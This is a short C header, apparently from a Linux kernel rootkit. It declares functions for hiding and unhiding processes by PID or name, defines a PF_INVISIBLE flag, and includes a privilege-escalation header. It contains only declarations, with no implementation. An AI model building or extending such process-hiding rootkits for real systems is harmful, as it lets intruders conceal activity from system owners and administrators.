#ifndef _PROC_HIDE_H
#define _PROC_HIDE_H

#include <linux/sched.h>
#include <linux/types.h>
#include <asm/current.h>
#include <uapi/asm/stat.h>		/* stat definition */
#include <linux/gfp.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <priv_escalation.h>

#include <linux/kernel.h>

#define MAX_H_PROC		10
#define PF_INVISIBLE 	0x10000000

void hide_proc(pid_t pid);
void show_proc(pid_t pid);

void add_hidden_proc(char *name);
void remove_hidden_proc(char *name);

int is_proc_hidden(char *name);
void init_hidden_procs(void);

void show_hidden_procs(void);
#endif /* _PROC_HIDE_H */
